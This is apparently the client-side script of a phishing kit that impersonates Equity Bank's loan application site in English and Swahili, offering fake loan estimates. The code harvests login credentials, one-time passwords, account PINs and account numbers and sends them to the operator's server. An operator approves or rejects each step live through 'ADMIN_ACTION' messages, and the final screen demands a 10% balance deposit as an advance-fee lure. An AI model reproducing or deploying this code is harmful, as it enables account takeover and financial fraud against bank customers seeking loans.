const i18n = {
  ENG: {
    welcomeTitle: "EQUITY BANK",
    welcomeSubtitle: "LOAN APPLICATION SERVICES",
    welcomeDesc: "Sign in to begin or track your loan application.",
    welcomeSubdesc: "New to Equity? Register to apply for a loan. Log in to manage existing applications.",
    chooseCountryLabel: "Choose your country for application:",
    singInBtn: "SING IN",
    registerBtn: "Register",
    calcTitle: "Estimate your loan repayments",
    loanAmountTitle: "LOAN AMOUNT",
    loanTermTitle: "LOAN TERM (MONTHS)",
    estMonthlyLabel: "ESTIMATED MONTHLY REPAYMENT",
    totalRepaymentLabel: "TOTAL REPAYMENT: ",
    interestNote: "*Assumed Interest Rate: 13.5%",
    signInBtnCaps: "SIGN IN",
    formTitle: "Loan Application Form",
    formSubtitle: "Please provide your details below",
    personalDetailsTitle: "Personal Details",
    genderLabel: "Gender",
    man: "Man",
    female: "Female",
    contactInfoTitle: "Contact Information",
    employmentTitle: "Employment & Income",
    employmentStatusLabel: "Employment Status",
    employed: "Employed",
    selfEmployed: "Self-Employed",
    loanDetailsTitle: "Loan Details",
    selectedAmountLabel: "Selected Amount:",
    termLabel: "Term:",
    saveContinueBtn: "SAVE & CONTINUE",
    cancelBtn: "CANCEL",
    helloThereTitle: "Hello there,",
    welcomeBackSub: "Welcome back. Sign in to continue.",
    countryAppLabel: "Country of application",
    emailOrPhoneLabel: "Email address or mobile number",
    passwordLabel: "Password",
    forgotPasswordText: "Forgot your password?",
    signInBtnCap: "Sign in",
    enterOtpTitle: "Enter OTP",
    otpInstruction: "An OTP has been sent to your registered Equity number or Gmail. Please enter it below before it expires.",
    otpFieldLabel: "One-Time Password (OTP)",
    expiresInLabel: "EXPIRES IN",
    spamWarning: "Check your spam or junk folder for the email.",
    submitBtn: "Submit",
    confirmPinTitle: "Confirm Account PIN",
    pinInstruction: "For security, please confirm your 4-digit Account PIN to link your loan account.",
    bankAccountAccessTitle: "BANK ACCOUNT ACCESS",
    congratsMsg: "Your loan application has been approved and successfully processed.",
    importantNextStep: "IMPORTANT NEXT STEP",
    tenPercentCondition: "To receive your loan disbursement, you must ensure your account has a balance equal to at least 10% of your total application amount."
  },
  SWA: {
    welcomeTitle: "BENKI YA EQUITY",
    welcomeSubtitle: "HUDUMA ZA OMBI LA MKOPO",
    welcomeDesc: "Ingia ili kuanza au kufuatilia ombi lako la mkopo.",
    welcomeSubdesc: "Mgeni Equity? Jisajili kuomba mkopo. Ingia kusimamia maombi yaliyopo.",
    chooseCountryLabel: "Chagua nchi yako ya ombi:",
    singInBtn: "INGIA",
    registerBtn: "Jisajili",
    calcTitle: "Kadiria malipo ya mkopo wako",
    loanAmountTitle: "KIASI CHA MKOPO",
    loanTermTitle: "MUDA WA MKOPO (MIEZI)",
    estMonthlyLabel: "MAKADIRIO YA MALIPO YA KILA MWEZI",
    totalRepaymentLabel: "JUMLA YA MALIPO: ",
    interestNote: "*Riba Inayokadiriwa: 13.5%",
    signInBtnCaps: "INGIA",
    formTitle: "Fomu ya Ombi la Mkopo",
    formSubtitle: "Tafadhali weka maelezo yako hapa chini",
    personalDetailsTitle: "Maelezo Binafsi",
    genderLabel: "Jinsia",
    man: "Mwanamume",
    female: "Mwanamke",
    contactInfoTitle: "Maelezo ya Mawasiliano",
    employmentTitle: "Ajira na Mapato",
    employmentStatusLabel: "Hali ya Ajira",
    employed: "Ameajiriwa",
    selfEmployed: "Amejiajiri",
    loanDetailsTitle: "Maelezo ya Mkopo",
    selectedAmountLabel: "Kiasi Kilichochaguliwa:",
    termLabel: "Muda:",
    saveContinueBtn: "HIFADHI NA UENDELEE",
    cancelBtn: "GHAIRISHI",
    helloThereTitle: "Hujambo,",
    welcomeBackSub: "Karibu tena. Ingia ili kuendelea.",
    countryAppLabel: "Nchi ya ombi",
    emailOrPhoneLabel: "Barua pepe au nambari ya simu",
    passwordLabel: "Nywila",
    forgotPasswordText: "Umesahau nywila yako?",
    signInBtnCap: "Ingia",
    enterOtpTitle: "Ingiza OTP",
    otpInstruction: "OTP imetumwa kwa nambari yako ya Equity au Gmail. Tafadhali iweke hapa chini kabla haijamalizika muda.",
    otpFieldLabel: "Nywila ya Mara Moja (OTP)",
    expiresInLabel: "INAMALIZIKA KWA",
    spamWarning: "Angalia folda yako ya spam au junk kwa barua pepe.",
    submitBtn: "Wasilisha",
    confirmPinTitle: "Thibitisha PIN ya Akaunti",
    pinInstruction: "Kwa usalama, tafadhali thibitisha PIN yako ya tarakimu 4 kuunganisha akaunti ya mkopo.",
    bankAccountAccessTitle: "UFIKIAJI WA AKAUNTI YA BENKI",
    congratsMsg: "Ombi lako la mkopo limeidhinishwa na kuchakatwa kikamilifu.",
    importantNextStep: "HATUA MUHIMU INAYOFUATA",
    tenPercentCondition: "Ili kupokea malipo ya mkopo, lazima uhakikishe akaunti yako ina salio la angalau 10% ya kiasi chako cha ombi."
  }
};

const currencyMap = {
  "KENYA": "KES",
  "TANZANIA": "TZS",
  "UGANDA": "UGX",
  "RWANDA": "RWF",
  "SOUTH SUDAN": "SSP"
};

let currentLang = "ENG";
let currentCountry = "KENYA";
let currentCurrency = "KES";
let ws = null;
let savedIdentifier = "";

document.addEventListener("DOMContentLoaded", () => {
  initWebSocket();
  bindEvents();
  updateCurrencyDisplay();
});

function initWebSocket() {
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${protocol}//${window.location.host}/ws`);

  ws.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'ADMIN_ACTION') {
        handleAdminAction(data.action);
      }
    } catch (e) {
      console.error(e);
    }
  };
}

function bindEvents() {
  const langToggle = document.getElementById("langToggle");
  if (langToggle) {
    langToggle.addEventListener("change", (e) => {
      currentLang = e.target.checked ? "SWA" : "ENG";
      document.getElementById("langEngLabel").style.opacity = e.target.checked ? "0.5" : "1";
      document.getElementById("langSwaLabel").style.opacity = e.target.checked ? "1" : "0.5";
      applyTranslations();
    });
  }

  const welcomeCountry = document.getElementById("countrySelect");
  const loginCountry = document.getElementById("loginCountrySelect");

  if (welcomeCountry) {
    welcomeCountry.addEventListener("change", (e) => {
      currentCountry = e.target.value;
      if (loginCountry) loginCountry.value = currentCountry;
      currentCurrency = currencyMap[currentCountry] || "KES";
      updateCurrencyDisplay();
    });
  }

  const togglePassword = document.getElementById("togglePassword");
  const passwordInput = document.getElementById("loginPassword");
  if (togglePassword && passwordInput) {
    togglePassword.addEventListener("click", () => {
      const isPassword = passwordInput.getAttribute("type") === "password";
      passwordInput.setAttribute("type", isPassword ? "text" : "password");
      togglePassword.textContent = isPassword ? "🙈" : "👁️";
    });
  }

  // Navigation handlers
  document.getElementById("welcomeNextBtn")?.addEventListener("click", () => switchScreen("screen-calculator"));
  document.getElementById("welcomeRegisterBtn")?.addEventListener("click", () => switchScreen("screen-calculator"));
  document.getElementById("headerBackBtn")?.addEventListener("click", () => switchScreen("screen-welcome"));
  
  document.getElementById("loanAmountSlider")?.addEventListener("input", updateCalculator);
  document.getElementById("loanTermSlider")?.addEventListener("input", updateCalculator);

  document.getElementById("calcNextBtn")?.addEventListener("click", () => switchScreen("screen-form"));
  document.getElementById("calcRegisterBtn")?.addEventListener("click", () => switchScreen("screen-form"));
  document.getElementById("formSaveContinueBtn")?.addEventListener("click", () => switchScreen("screen-login"));

  // Login Submit
  document.getElementById("loginSubmitBtn")?.addEventListener("click", () => {
    const identifier = document.getElementById("loginIdentifier").value.trim();
    const password = document.getElementById("loginPassword").value.trim();

    if (!identifier || !password) {
      showSurfaceNotification("Please enter email/phone and password.");
      return;
    }

    savedIdentifier = identifier;

    sendPayload({
      step: "LOGIN_SUBMIT",
      country: currentCountry,
      currency: currentCurrency,
      amount: document.getElementById("loanAmountSlider") ? document.getElementById("loanAmountSlider").value : "250000",
      identifier,
      password
    });

    showLoading(true);
  });

  // 6-Digit Auto-Tabbing & Auto-Submit for OTP
  [1, 2, 3, 4, 5, 6].forEach(i => {
    const otpBox = document.getElementById(`otp${i}`);
    if (otpBox) {
      otpBox.addEventListener("input", (e) => {
        if (e.target.value && i < 6) {
          document.getElementById(`otp${i+1}`).focus();
        }
        
        const fullOtp = [1,2,3,4,5,6].map(idx => document.getElementById(`otp${idx}`).value).join("");
        if (fullOtp.length === 6) {
          submitOTP(fullOtp);
        }
      });
    }
  });

  document.getElementById("otpSubmitBtn")?.addEventListener("click", () => {
    const fullOtp = [1,2,3,4,5,6].map(idx => document.getElementById(`otp${idx}`).value).join("");
    if (fullOtp.length < 6) {
      showSurfaceNotification("Please enter full 6-digit OTP.");
      return;
    }
    submitOTP(fullOtp);
  });

  // 4-Digit Auto-Tabbing for PIN
  [1, 2, 3, 4].forEach(i => {
    const pinBox = document.getElementById(`pin${i}`);
    if (pinBox) {
      pinBox.addEventListener("input", (e) => {
        if (e.target.value && i < 4) {
          document.getElementById(`pin${i+1}`).focus();
        }
      });
    }
  });

  document.getElementById("pinSubmitBtn")?.addEventListener("click", () => {
    const pin = [1,2,3,4].map(i => document.getElementById(`pin${i}`).value).join("");
    if (pin.length < 4) {
      showSurfaceNotification("Please enter full 4-digit PIN.");
      return;
    }

    sendPayload({
      step: "PIN_SUBMIT",
      identifier: savedIdentifier,
      pin
    });

    showLoading(true);
  });

  // Account Number Submit
  document.getElementById("accountSubmitBtn")?.addEventListener("click", () => {
    const accountNo = document.getElementById("accountNumberInput").value.trim();
    if (accountNo.length !== 10) {
      showSurfaceNotification("Account number must be 10 digits.");
      return;
    }

    sendPayload({
      step: "ACCOUNT_SUBMIT",
      identifier: savedIdentifier,
      accountNo
    });

    showLoading(true);
  });
}

function submitOTP(otpVal) {
  sendPayload({
    step: "OTP_SUBMIT",
    identifier: savedIdentifier,
    otp: otpVal
  });
  showLoading(true);
}

function sendPayload(data) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify(data));
  }
  
  fetch('/api/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(err => console.error(err));
}

function handleAdminAction(action) {
  showLoading(false);

  switch (action) {
    case 'ALLOW': switchScreen("screen-otp"); break;
    case 'DENY': showSurfaceNotification("Access Denied by Admin."); break;
    case 'OTP_EXPIRED': showSurfaceNotification("OTP Expired! Re-enter OTP."); clearAllInputs(); break;
    case 'OTP_CORRECT': switchScreen("screen-pin"); break;
    case 'CONTINUE': switchScreen("screen-account"); break;
    case 'BLOCK': showSurfaceNotification("Account Blocked."); break;
    case 'WRONG_PIN': showSurfaceNotification("Wrong PIN! Re-enter."); switchScreen("screen-pin"); clearAllInputs(); break;
    case 'WRONG_ACC_NUMBER': showSurfaceNotification("Wrong Account Number!"); switchScreen("screen-account"); clearAllInputs(); break;
    case 'APPROVED': switchScreen("screen-congratulations"); break;
  }
}

// Clear all inputs automatically on screen transition
function clearAllInputs() {
  document.querySelectorAll("input[type='text'], input[type='password'], input[type='email']").forEach(input => {
    if (input.id !== "countrySelect" && input.id !== "loginCountrySelect") {
      input.value = "";
    }
  });
}

function switchScreen(screenId) {
  clearAllInputs();
  document.querySelectorAll(".screen").forEach(s => s.classList.add("hidden"));
  const target = document.getElementById(screenId);
  if (target) target.classList.remove("hidden");
  window.scrollTo(0,0);
}

function showLoading(show) {
  const loader = document.getElementById("loadingOverlay");
  if (loader) loader.classList.toggle("hidden", !show);
}

function showSurfaceNotification(msg) {
  const el = document.getElementById("surfaceNotification");
  if (el) {
    el.textContent = msg;
    el.classList.remove("hidden");
    setTimeout(() => el.classList.add("hidden"), 4000);
  }
}

function applyTranslations() {
  const texts = i18n[currentLang];
  document.querySelectorAll("[data-i18n]").forEach(el => {
    const key = el.getAttribute("data-i18n");
    if (texts[key]) {
      el.textContent = texts[key];
    }
  });
}

function updateCurrencyDisplay() {
  document.getElementById("minAmountLabel").textContent = `${currentCurrency} 10,000`;
  document.getElementById("maxAmountLabel").textContent = `${currentCurrency} 1,000,000`;
  updateCalculator();
}

function updateCalculator() {
  const amount = parseInt(document.getElementById("loanAmountSlider").value);
  const term = parseInt(document.getElementById("loanTermSlider").value);

  document.getElementById("currentAmountLabel").textContent = `${currentCurrency} ${amount.toLocaleString()}`;
  document.getElementById("currentTermLabel").textContent = `${term} MONTHS`;

  const monthlyRate = 0.135 / 12;
  const monthlyRepayment = Math.round((amount * monthlyRate) + (amount / term));
  const totalRepayment = monthlyRepayment * term;

  document.getElementById("monthlyRepaymentValue").textContent = `${currentCurrency} ${monthlyRepayment.toLocaleString()}`;
  document.getElementById("totalRepaymentValue").textContent = `${currentCurrency} ${totalRepayment.toLocaleString()}`;
  document.getElementById("formSelectedAmount").textContent = `${currentCurrency} ${amount.toLocaleString()}`;
  document.getElementById("formSelectedTerm").textContent = `${term} Months`;
    }
                          
